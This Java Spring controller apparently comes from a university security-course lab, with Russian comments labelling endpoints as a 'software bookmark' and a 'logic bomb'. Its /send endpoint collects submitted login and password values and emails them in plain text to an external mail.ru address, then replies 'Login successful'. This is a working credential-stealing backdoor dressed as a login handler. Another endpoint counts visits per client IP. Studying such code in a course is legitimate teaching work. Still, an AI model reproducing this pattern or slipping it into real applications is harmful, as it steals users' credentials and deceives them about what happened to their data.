package com.study.course4.bpid.controller;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;

import static com.study.course4.bpid.IpAdressMap.IP_ADRESSES;

@Controller
@RequestMapping("/lab1")
public class Lab1Controller {

    @Autowired
    private JavaMailSender mailSender;

    // програмнная закладка
    @GetMapping("/software_bookmark")
    public String softwareBookmark(){
        return "software_bookmark";
    }


    // логическая бомба
    @GetMapping("logical_bomb")
    public String logicalBomb(Model model, HttpServletRequest request){
        String ipAdress = request.getRemoteAddr();
        if(IP_ADRESSES.get(ipAdress) == null){
            IP_ADRESSES.put(ipAdress, 1);
        } else {
            IP_ADRESSES.replace(ipAdress, IP_ADRESSES.get(ipAdress) + 1);
        }
        model.addAttribute("count", IP_ADRESSES.get(ipAdress));
        return "logical_bomb";
    }

    @PostMapping("/send")
    @ResponseBody
    public String sendData(@RequestParam(name = "login", required = false) String login,
                           @RequestParam(name = "password", required = false) String password){
        SimpleMailMessage message = new SimpleMailMessage();
        message.setFrom("ewrr_98@mail.ru");
        message.setTo("bogdant99@mail.ru");
        message.setSubject("Hello");
        message.setText("Login: " + login + "\nPassword: " + password);
        mailSender.send(message);
        return "Login successful";
    }

}
